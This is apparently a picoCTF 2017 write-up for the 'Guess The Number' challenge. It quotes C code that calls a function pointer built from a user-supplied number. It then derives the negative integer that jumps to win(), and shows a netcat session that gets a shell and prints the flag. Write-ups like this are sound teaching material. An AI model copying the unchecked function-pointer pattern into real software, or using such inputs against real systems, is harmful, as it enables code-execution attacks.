## Guess The Number - 75

### Description

Just a simple number-guessing game. How hard could it be? [Binary](./guess_num) [Source](./guess_num.c). Connect on shell2017.picoctf.com:30919.

### Hint

  - What is the program doing with your input number?
  - strtol checks for overflow, but it does allow negative numbers...

### Write up

```c

uintptr_t val;
...
scanf("%32s", buf);
val = strtol(buf, NULL, 10);

printf("You entered %d. Let's see if it was right...\n", val);

val >>= 4;
((void (*)(void))val)();
```  

The program gets string from user, cast it to int, right shifts 4 bit, and use it as a function pointer.

So we want val be address of win(), which is `0x0804852b`

Before right shift, val have to be 0x804852b0 which is 2152223408 in decimal.

But in integer, it's actually -2142743888.


    $ nc localhost 30919
    Welcome to the number guessing game!
    I'm thinking of a number. Can you guess it?
    Guess right and you get a shell!
    Enter your number: -2142743888
    You entered -2142743888. Let's see if it was right...
    Congratulations! Have a shell:
    /bin/sh: 0: can't access tty; job control turned off
    $ ls
    flag.txt
    guess_num
    xinetd_wrapper.sh
    $ cat flag.txt
    d1ec8d4078eac1112548c1a6a00cfe07

> d1ec8d4078eac1112548c1a6a00cfe07
